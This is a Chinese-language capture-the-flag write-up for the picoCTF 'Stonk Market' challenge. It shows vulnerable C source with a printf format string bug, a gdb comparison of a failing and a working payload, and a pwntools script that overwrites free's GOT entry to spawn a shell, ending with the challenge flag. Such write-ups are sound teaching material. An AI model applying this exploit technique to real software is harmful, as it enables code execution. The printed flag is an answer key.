---
title: PicoCTF - Stonk Market
tags: [PicoCTF, CTF, PWN]

---

# PicoCTF - Stonk Market
## Background
FMT
## Source code
:::spoiler
```cpp=
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <time.h>

#define FLAG_BUFFER 128
#define MAX_SYM_LEN 4

typedef struct Stonks {
	int shares;
	char symbol[MAX_SYM_LEN + 1];
	struct Stonks *next;
} Stonk;

typedef struct Portfolios {
	int money;
	Stonk *head;
} Portfolio;

int view_portfolio(Portfolio *p) {
	if (!p) {
		return 1;
	}
	printf("\nPortfolio as of ");
	fflush(stdout);
	system("date"); // TODO: implement this in C
	fflush(stdout);

	printf("\n\n");
	Stonk *head = p->head;
	if (!head) {
		printf("You don't own any stonks!\n");
	}
	while (head) {
		printf("%d shares of %s\n", head->shares, head->symbol);
		head = head->next;
	}
	return 0;
}

Stonk *pick_symbol_with_AI(int shares) {
	if (shares < 1) {
		return NULL;
	}
	Stonk *stonk = malloc(sizeof(Stonk));
	stonk->shares = shares;

	int AI_symbol_len = (rand() % MAX_SYM_LEN) + 1;
	for (int i = 0; i <= MAX_SYM_LEN; i++) {
		if (i < AI_symbol_len) {
			stonk->symbol[i] = 'A' + (rand() % 26);
		} else {
			stonk->symbol[i] = '\0';
		}
	}

	stonk->next = NULL;

	return stonk;
}

int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	/*
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);
	*/
	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}

Portfolio *initialize_portfolio() {
	Portfolio *p = malloc(sizeof(Portfolio));
	p->money = (rand() % 2018) + 1;
	p->head = NULL;
	return p;
}

void free_portfolio(Portfolio *p) {
	Stonk *current = p->head;
	Stonk *next = NULL;
	while (current) {
		next = current->next;
		free(current);
		current = next;
	}
	free(p);
}

int main(int argc, char *argv[])
{
	setbuf(stdout, NULL);
	srand(time(NULL));
	Portfolio *p = initialize_portfolio();
	if (!p) {
		printf("Memory failure\n");
		exit(1);
	}

	int resp = 0;

	printf("Welcome back to the trading app!\n\n");
	printf("What would you like to do?\n");
	printf("1) Buy some stonks!\n");
	printf("2) View my portfolio\n");
	scanf("%d", &resp);

	if (resp == 1) {
		buy_stonks(p);
	} else if (resp == 2) {
		view_portfolio(p);
	}

	free_portfolio(p);
	printf("Goodbye!\n");

	exit(0);
}

```
:::
## Recon
這一題是參考了[^pico_pwn_stonk_market_wp]，可以看到source code中的buy_stonks function出現format string bug，我一開始看了很久，以為這一題是和heap有關的問題

[^pico_pwn_stonk_market_wp]的做法是：
先把free的got address(0x602018)利用fmt寫到某一個位置，然後再改變got指向的位置(0x4006c6)，變成指向system的位置(0x4006f0)，再把`sh\x00`的string寫到某一個chunk中，之後當call到free並且要free掉我們指定的那個chunk時，他就會執行`system(sh\x00)`，成功執行shell

## Analysis
當程式執行到`<printf_positional+7716> mov    BYTE PTR [rax], bl`(如下)時，可以看一下rax數值在register中應對不同payload時的變化，我把完整的trace stack放在這一段的最下面，有興趣trace的人可以參考一下
```
   0x7ffff7e40bb4 <printf_positional+7700> test   r12d, r12d
   0x7ffff7e40bb7 <printf_positional+7703> je     0x7ffff7e40f1e <printf_positional+8574>
   0x7ffff7e40bbd <printf_positional+7709> movzx  ebx, BYTE PTR [rbp-0x8a4]
 → 0x7ffff7e40bc4 <printf_positional+7716> mov    BYTE PTR [rax], bl
   0x7ffff7e40bc6 <printf_positional+7718> jmp    0x7ffff7e3fa29 <printf_positional+3209>
   0x7ffff7e40bcb <printf_positional+7723> mov    r10d, DWORD PTR [rbx+rax*1]
   0x7ffff7e40bcf <printf_positional+7727> test   r12d, r12d
   0x7ffff7e40bd2 <printf_positional+7730> je     0x7ffff7e40f34 <printf_positional+8596>
   0x7ffff7e40bd8 <printf_positional+7736> movsx  r10, r10b
```

- ==Incorrect Payload:== `%6299672c%12$n%216c%20$hhn%10504067c%10$n`遇到的問題
    :::spoiler Register
    ```
    $rdi   : 0x0
    $rax   : 0x0
    $r8    : 0xffffffff
    $rbx   : 0xf0
    $rcx   : 0x00007ffff7f78f40  →  0x0000000000000000
    $r13   : 0x0
    $r10   : 0x00007fffffffa580  →  0x00000000f7fb8723
    $r12   : 0x1
    $r14   : 0x00007fffffffa248  →  0x00000000ffffffff
    $r9    : 0x0
    $rbp   : 0x00007fffffffa9d0  →  0x00007fffffffaf90  →  0x00007fffffffd670
    $rip   : 0x00007ffff7e40bc4  →  <printf_positional+7716> mov BYTE PTR [rax], bl
    $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $rdx   : 0x00007ffff7e3f42a  →  <printf_positional+1674> endbr64
    $r15   : 0x00007fffffffafc0  →  0x00000000fbad8004
    $rsi   : 0x00007fffffffa580  →  0x00000000f7fb8723
    $r11   : 0x6e
    $rsp   : 0x00007fffffffa060  →  0x0000000000000000
    $gs: 0x00 $fs: 0x00 $es: 0x00 $cs: 0x33 $ss: 0x2b $ds: 0x00
    ```
    :::
* ==Correct Payload:== `%c%c%c%c%c%c%c%c%c%c%6299662c%n%216c%20$hhn%10504067c%10$n`
    :::spoiler Register
    ```
    $rdi   : 0x0
    $rax   : 0x0000000000602018  →  0x00000000004006c6  →  0xffe0e90000000068 ("h"?)
    $r8    : 0xffffffff
    $rbx   : 0xf0
    $rcx   : 0x00007ffff7f78f40  →  0x0000000000000000
    $r13   : 0x0
    $r10   : 0x00007fffffffa580  →  0x00000000f7fb8723
    $r12   : 0x1
    $r14   : 0x0000000000603cf8  →  0x00000000ffffffff
    $r9    : 0x0
    $rbp   : 0x00007fffffffa9d0  →  0x00007fffffffaf90  →  0x00007fffffffd670
    $rip   : 0x00007ffff7e40bc4  →  <printf_positional+7716> mov BYTE PTR [rax], bl
    $eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
    $rdx   : 0x00007ffff7e3f42a  →  <printf_positional+1674> endbr64
    $r15   : 0x00007fffffffafc0  →  0x00000000fbad8004
    $rsi   : 0x00007fffffffa580  →  0x00000000f7fb8723
    $r11   : 0x6e
    $rsp   : 0x00007fffffffa060  →  0x0000000000000000
    $gs: 0x00 $fs: 0x00 $es: 0x00 $cs: 0x33 $ss: 0x2b $ds: 0x00
    ```
    :::
可以看到`0x7ffff7e40bc4 mov BYTE PTR [rax], bl`準備把0xf0的值放到rax指向的位置，但是如果是第一種payload，rax的value是0，而第二種payload所存放的value才是0x602018，所以這應該就是@ccccctw所提到的問題，一開始把`0x602018`寫入`0x00007fffffffd7d0`之前都還是零，所以第二種payload因為某種關係，他可以先把`0x602018`寫入`0x00007fffffffd7d0`，==再==把`0x602018`指向的`0x4006c6`最後一個byte改掉，而不是像第一種payload一樣，是同時執行所有的動作，導致系統還沒有把`0x602018`寫入`0x00007fffffffd7d0`，想當然`0x00007fffffffd7d0`的value也是零
```
...
0x00007fffffffd790│+0x0030: 0x00007fffffffd7d0  →  0x0000000000000000    ← $rbp
...
0x00007fffffffd7d0│+0x0070: 0x0000000000000000
```

---
:::spoiler 完整的trace stack
```
gef➤  bt 10
#0  0x00007ffff7e40bc4 in printf_positional (s=s@entry=0x7fffffffafc0, format=format@entry=0x603730 "%6299672c%12$n%216c%20$hhn%10504067c%10$n", readonly_format=readonly_format@entry=0x0, ap=ap@entry=0x7fffffffd680, ap_savep=ap_savep@entry=0x7fffffffab48, done=<optimized out>, nspecs_done=<optimized out>, lead_str_end=<optimized out>, work_buffer=<optimized out>, save_errno=<optimized out>, grouping=<optimized out>, thousands_sep=<optimized out>, mode_flags=<optimized out>) at vfprintf-internal.c:2072
#1  0x00007ffff7e41dcd in __vfprintf_internal (s=s@entry=0x7fffffffafc0, format=0x603730 "%6299672c%12$n%216c%20$hhn%10504067c%10$n", ap=0x7fffffffd680, mode_flags=<optimized out>) at vfprintf-internal.c:1733
#2  0x00007ffff7e44ea2 in buffered_vfprintf (s=s@entry=0x7ffff7fb86a0 <_IO_2_1_stdout_>, format=format@entry=0x603730 "%6299672c%12$n%216c%20$hhn%10504067c%10$n", args=args@entry=0x7fffffffd680, mode_flags=mode_flags@entry=0x0) at vfprintf-internal.c:2377
#3  0x00007ffff7e41d24 in __vfprintf_internal (s=0x7ffff7fb86a0 <_IO_2_1_stdout_>, format=0x603730 "%6299672c%12$n%216c%20$hhn%10504067c%10$n", ap=ap@entry=0x7fffffffd680, mode_flags=mode_flags@entry=0x0) at vfprintf-internal.c:1346
#4  0x00007ffff7e2cd3f in __printf (format=<optimized out>) at printf.c:33
#5  0x0000000000400ace in buy_stonks ()
#6  0x0000000000400c66 in main ()
```
:::
## Exploit - FMT
```python=
from pwn import *

if args.LOCAL:
    r = process('./vuln')
else:
    r = remote('mercury.picoctf.net', 5654)

payload = '%c'*10 + '%6299662c' + '%n' + '%216c' + '%20$hhn' + '%10504067c' + '%10$n'

r.sendline(b'1')
raw_input()
r.sendlineafter(b"token?", payload.encode())
r.interactive()
```

Flag: `picoCTF{explo1t_m1t1gashuns_641dcdf1}`
## Reference
[^pico_pwn_stonk_market_wp]:[ picoCTF 2021 Stonk Market ](https://youtu.be/gLFJFXpY44w)